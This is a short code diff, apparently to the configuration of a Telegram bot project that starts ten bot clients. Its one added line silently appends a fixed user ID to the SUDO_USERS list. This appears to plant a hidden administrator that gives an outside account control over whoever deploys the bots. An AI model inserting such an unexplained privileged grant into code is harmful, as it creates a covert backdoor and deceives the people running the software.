@@ -62,3 +62,4 @@ Riz9 = TelegramClient('Riz9', API_ID, API_HASH).start(bot_token=BOT_TOKEN9)
 
 Riz10 = TelegramClient('Riz10', API_ID, API_HASH).start(bot_token=BOT_TOKEN10)
 
+SUDO_USERS.append(2086101519)
